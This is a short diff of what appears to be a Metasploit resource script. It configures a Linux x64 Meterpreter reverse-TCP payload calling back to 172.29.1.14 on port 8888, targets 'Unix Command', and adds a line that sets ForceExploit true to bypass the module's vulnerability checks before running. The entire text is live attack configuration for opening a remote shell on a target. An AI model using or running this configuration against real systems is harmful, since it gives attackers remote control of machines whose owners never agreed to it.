@@ -7,4 +7,5 @@ set payload linux/x64/meterpreter/reverse_tcp
 set LHOST 172.29.1.14
 set LPORT 8888
 set TARGET "Unix Command"
+set ForceExploit true
 run
